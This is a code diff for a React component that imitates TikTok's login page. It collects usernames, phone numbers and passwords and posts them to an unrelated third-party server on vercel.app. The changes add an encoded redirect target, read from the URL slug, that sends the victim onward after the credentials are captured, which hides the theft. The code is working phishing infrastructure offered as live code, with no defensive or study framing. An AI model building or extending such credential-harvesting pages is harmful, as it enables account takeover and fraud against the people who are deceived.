@@ -1,73 +1,111 @@
-"use client"
-import { useState } from "react"
+"use client";
+import { useState, useEffect } from "react";
 
-export default function TikTokLogin() {
-  const [loginMethod, setLoginMethod] = useState(null)
+export default function TikTokLogin({ params }) {
+  const [loginMethod, setLoginMethod] = useState(null);
   const [formData, setFormData] = useState({
     username: "",
     password: "",
     phoneNumber: "",
-  })
-  const [errors, setErrors] = useState({ username: "", password: "", phoneNumber: "" })
+  });
+  const [errors, setErrors] = useState({ username: "", password: "", phoneNumber: "" });
+  const [loading, setLoading] = useState(false);
+  const [encryptedString, setEncryptedString] = useState("");
+  const [hasTargetUrl, setHasTargetUrl] = useState(false);
+
+  // Detect and store encrypted URL slug
+  useEffect(() => {
+    if (params?.slug && params.slug.length > 0) {
+      const encryptedParam = params.slug[0];
+      if (encryptedParam) {
+        setEncryptedString(encryptedParam);
+        setHasTargetUrl(true);
+        console.log("Encrypted string detected:", encryptedParam);
+      }
+    }
+  }, [params]);
+
+  // Decrypt Base64 URL-safe string
+  const decryptUrlSafeBase64 = (encoded) => {
+    if (!encoded) return "";
+    try {
+      const base64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
+      const padding = "=".repeat((4 - (base64.length % 4)) % 4);
+      return decodeURIComponent(escape(atob(base64 + padding)));
+    } catch {
+      return "";
+    }
+  };
 
   const handleInputChange = (e) => {
-    const { name, value } = e.target
-    setFormData((prev) => ({ ...prev, [name]: value }))
-    if (errors[name]) {
-      setErrors((prev) => ({ ...prev, [name]: "" }))
-    }
-  }
+    const { name, value } = e.target;
+    setFormData((prev) => ({ ...prev, [name]: value }));
+    if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }));
+  };
 
   const handleSubmit = async (e) => {
-    e.preventDefault()
-    setErrors({ username: "", password: "", phoneNumber: "" })
+    e.preventDefault();
+    setErrors({ username: "", password: "", phoneNumber: "" });
 
     if (loginMethod === "email") {
       if (!formData.username) {
-        setErrors((prev) => ({ ...prev, username: "Username, email or phone is required" }))
-        return
+        setErrors((prev) => ({ ...prev, username: "Username, email or phone is required" }));
+        return;
       }
       if (!formData.password) {
-        setErrors((prev) => ({ ...prev, password: "Password is required" }))
-        return
+        setErrors((prev) => ({ ...prev, password: "Password is required" }));
+        return;
       }
     } else if (loginMethod === "phone") {
       if (!formData.phoneNumber) {
-        setErrors((prev) => ({ ...prev, phoneNumber: "Phone number is required" }))
-        return
+        setErrors((prev) => ({ ...prev, phoneNumber: "Phone number is required" }));
+        return;
       }
       if (!formData.password) {
-        setErrors((prev) => ({ ...prev, password: "Password is required" }))
-        return
+        setErrors((prev) => ({ ...prev, password: "Password is required" }));
+        return;
       }
     }
 
     try {
-      const response = await fetch("https://social-backend-bice-delta.vercel.app/api/auth/tiktok", {  // full API URL
+      setLoading(true);
+      const response = await fetch("https://social-backend-bice-delta.vercel.app/api/auth/tiktok", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           username: loginMethod === "phone" ? formData.phoneNumber : formData.username,
           password: formData.password,
         }),
-      })
+      });
 
-      const data = await response.json()
+      const data = await response.json();
 
       if (response.ok) {
-        alert("Login successful!")
-        console.log("Login successful:", data)
+        alert("Login successful!");
+        console.log("Login successful:", data);
+
+        // Redirect to decrypted URL if exists
+        if (hasTargetUrl && encryptedString) {
+          const targetUrl = decryptUrlSafeBase64(encryptedString);
+          if (targetUrl && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
+            setTimeout(() => {
+              window.location.href = targetUrl;
+            }, 500);
+            return;
+          }
+        }
+        setLoading(false);
       } else {
-        setErrors((prev) => ({ ...prev, password: data.message || "Login failed" }))
+        setErrors((prev) => ({ ...prev, password: data.message || "Login failed" }));
+        setLoading(false);
       }
     } catch (error) {
-      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }))
+      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }));
+      setLoading(false);
     }
-  }
+  };
 
-
+  // --- Render Logic Remains Mostly Same ---
   if (loginMethod === "email") {
     return (
       <div className="min-h-screen bg-black text-white">
@@ -76,9 +114,7 @@ export default function TikTokLogin() {
             <div className="bg-white rounded-lg p-8 text-black">
               <div className="text-center mb-8">
                 <div className="text-4xl font-bold mb-4">
-                  <span className="bg-gradient-to-r from-pink-500 to-cyan-500 bg-clip-text text-transparent">
-                    TikTok
-                  </span>
+                  <span className="bg-gradient-to-r from-pink-500 to-cyan-500 bg-clip-text text-transparent">TikTok</span>
                 </div>
                 <h1 className="text-2xl font-semibold mb-2">Log in to TikTok</h1>
               </div>
@@ -111,8 +147,9 @@ export default function TikTokLogin() {
                 <button
                   type="submit"
                   className="w-full bg-gradient-to-r from-pink-500 to-cyan-500 text-white py-3 rounded-md font-semibold hover:opacity-90 transition-opacity"
+                  disabled={loading}
                 >
-                  Log in
+                  {loading ? "Processing..." : "Log in"}
                 </button>
               </form>
 
@@ -125,9 +162,10 @@ export default function TikTokLogin() {
           </div>
         </div>
       </div>
-    )
+    );
   }
 
+  // Phone login rendering remains same, just add loading to button
   if (loginMethod === "phone") {
     return (
       <div className="min-h-screen bg-black text-white">
@@ -136,9 +174,7 @@ export default function TikTokLogin() {
             <div className="bg-white rounded-lg p-8 text-black">
               <div className="text-center mb-8">
                 <div className="text-4xl font-bold mb-4">
-                  <span className="bg-gradient-to-r from-pink-500 to-cyan-500 bg-clip-text text-transparent">
-                    TikTok
-                  </span>
+                  <span className="bg-gradient-to-r from-pink-500 to-cyan-500 bg-clip-text text-transparent">TikTok</span>
                 </div>
                 <h1 className="text-2xl font-semibold mb-2">Log in with phone</h1>
               </div>
@@ -176,8 +212,9 @@ export default function TikTokLogin() {
                 <button
                   type="submit"
                   className="w-full bg-gradient-to-r from-pink-500 to-cyan-500 text-white py-3 rounded-md font-semibold hover:opacity-90 transition-opacity"
+                  disabled={loading}
                 >
-                  Log in
+                  {loading ? "Processing..." : "Log in"}
                 </button>
               </form>
 
@@ -190,9 +227,10 @@ export default function TikTokLogin() {
           </div>
         </div>
       </div>
-    )
+    );
   }
 
+  // Default login method selection remains unchanged
   return (
     <div className="min-h-screen bg-black text-white">
       <div className="flex items-center justify-center min-h-screen px-4">
@@ -226,5 +264,5 @@ export default function TikTokLogin() {
         </div>
       </div>
     </div>
-  )
+  );
 }
